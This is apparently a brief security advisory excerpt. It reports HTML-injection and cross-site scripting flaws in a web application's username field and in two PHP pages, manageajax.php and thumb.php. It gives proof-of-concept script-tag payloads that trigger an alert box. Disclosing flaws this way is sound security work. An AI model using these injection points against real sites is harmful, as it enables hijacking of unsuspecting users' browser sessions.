Attackers can use a browser to exploit these issues. To exploit a cross-site scripting vulnerability, an attacker must entice an unsuspecting user to follow a malicious URI.

HTML-Injection:
Enter the value &lt;script&gt;alert(/SV/)&lt;/script&gt; in the username field under the "change username" functionality.


Cross-site scripting:
The following example URIs are available:

http://www.example.com/manageajax.php?action=newcal&amp;y=&lt;script&gt;alert(/XSS/)&lt;/script&gt;
http://www.example.com/thumb.php?pic=&lt;script&gt;alert(/XSS/)&lt;/script&gt;
